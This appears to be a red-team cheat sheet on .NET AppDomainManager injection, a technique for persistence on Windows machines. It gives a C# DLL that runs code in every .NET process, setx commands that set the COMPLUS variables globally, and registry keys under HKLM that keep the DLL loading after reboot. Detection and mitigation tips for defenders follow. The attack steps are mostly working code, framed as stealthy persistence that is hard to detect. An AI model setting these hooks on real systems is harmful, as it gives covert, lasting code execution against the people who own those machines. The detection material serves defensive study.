# 🧠 AppDomainManager Injection - Living Off the Land

**AppDomainManager injection** is an advanced .NET persistence technique where a custom `AppDomainManager` class is loaded into **every .NET application** silently. It's **stealthy**, **fileless**, and **OS-trusted** — often invisible to EDRs.

> ⚠️ Very few defenders detect this. Use only in advanced red team labs. This is a deep persistence mechanism.

---

## 🛠️ What It Does
- Injects attacker-controlled logic into all .NET processes
- Leverages `AppDomainManagerAssembly` + `AppDomainManagerType` environment variables
- Works without creating services or startup items
- Survives reboots when set via environment or registry

---

## 💣 Example: Global .NET Code Injection

### 1. Create Malicious AppDomainManager DLL
```csharp
using System;
public class EvilDomainManager : AppDomainManager {
  public override void InitializeNewDomain(AppDomainSetup setup) {
    System.Diagnostics.Process.Start("calc.exe");
  }
}
```
✅ This DLL runs `calc.exe` inside any .NET process at launch — no EXE required

---

### 2. Set Environment Variables to Load DLL Globally
```cmd
setx COMPLUS_AppDomainManagerAssembly "C:\Users\Public\evil.dll, EvilDomainManager"
setx COMPLUS_AppDomainManagerType "EvilDomainManager"
```
✅ Now every .NET process will load your DLL automatically

---

### 3. Registry-Based Persistence (for all users)
```reg
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework]
"AppDomainManagerAssembly"="C:\Users\Public\evil.dll, EvilDomainManager"
"AppDomainManagerType"="EvilDomainManager"
```
✅ Survives reboot — extremely stealthy persistence

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Unexpected AppDomainManager registry keys | Hunt for custom DLL paths under `.NETFramework` keys |
| All .NET apps launching child processes | Flag `calc.exe`, `powershell.exe` or outbound connections from trusted apps |
| Modified environment vars | Monitor changes to `COMPLUS_*` vars via GPO or Sysmon

---

## 🔐 Mitigation Strategies
- Audit .NET Framework registry keys on all endpoints
- Block or log access to `AppDomainManager` registry entries
- Monitor child processes launched by .NET processes (`explorer.exe` → `calc.exe` is a red flag)
- Use AppLocker/WDAC to block untrusted `.dll` files in user space

---

> 🧠 This method is near-undetectable by default Windows logging. APTs and red teams can persist *for months* unless defenders inspect .NET startup behavior. Use it wisely — or be the one who catches it.
